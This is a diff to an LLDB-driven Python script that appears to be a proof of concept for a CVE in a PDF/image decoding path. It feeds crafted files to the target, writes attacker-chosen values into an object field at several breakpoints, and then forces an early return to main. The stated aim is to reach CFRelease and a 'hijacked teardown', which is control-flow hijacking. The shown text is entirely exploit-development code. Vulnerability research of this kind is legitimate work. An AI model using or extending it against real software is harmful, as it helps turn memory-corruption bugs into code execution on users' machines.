@@ -94,7 +94,7 @@ b_m3 = t.BreakpointCreateByName("marker3")
 b_fin = t.BreakpointCreateByName("data_release_info")
 b_st = t.BreakpointCreateByName("aa_cache_render"); b_st.SetOneShot(True)
 p = t.LaunchSimple(["k2_s1000.pdf", "r.png", "k2_d31472.pdf", "k2_s1000.pdf"], None, CVE)
-R = None; CB = None; TGT = None; stores = 0; patched = 0; skips = 0; result = "incomplete"
+R = None; CB = None; TGT = None; stores = 0; patched = 0; skips = 0; abandoned = False; result = "incomplete"
 if p and p.IsValid():
     th = p.GetSelectedThread()
     pc0 = safe_pc_addr(th.GetSelectedFrame())
@@ -141,10 +141,23 @@ if p and p.IsValid():
             patched += 1
             if patched <= 3:
                 T("store#%d x2->%x x0->%x" % (patched, R + 0x18, TGT))
-            if patched >= 5:
-                # patch persisted — drop the store bp, let decode finish
+            if patched >= 5 and not abandoned:
+                # patch persisted — drop the store bp, abandon the corrupt decode,
+                # unwind straight to main -> marker3 -> CFRelease -> hijacked teardown
                 if b_w: t.BreakpointDelete(b_w.GetID()); b_w = 0
-                T("store bp deleted after %d patches" % patched)
+                th2 = p.GetSelectedThread()
+                mframe = None
+                for fi in range(th2.GetNumFrames()):
+                    f2 = th2.GetFrameAtIndex(fi)
+                    if symn(f2) == "main":
+                        mframe = f2; break
+                if mframe is not None:
+                    ok = th2.ReturnFromFrame(mframe, lldb.SBValue())
+                    T("returned-to-main ok=%s" % ok)
+                    abandoned = True
+                else:
+                    T("no main frame found; continuing crawl")
+                    abandoned = True
             p.Continue()
         elif "marker3" in nm:
             v = read_q(p, R + 0x18) if R else None
